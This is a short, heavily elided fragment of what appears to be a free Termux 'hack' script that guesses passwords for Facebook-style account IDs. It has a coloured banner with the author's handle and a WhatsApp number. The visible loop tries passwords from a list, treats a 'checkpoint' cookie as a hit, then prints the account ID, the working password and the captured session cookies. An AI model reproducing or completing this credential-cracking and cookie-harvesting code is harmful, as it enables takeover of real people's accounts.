...
╠══[Facebook                 • KK KING ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mTERMUX BEST HACK  ]   ║\33[1;34m   
╠══[Whatsapp                 • 01725891440 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE]         ║ \33[1;32m   
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[KK-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " KK,  Ok,  id"')
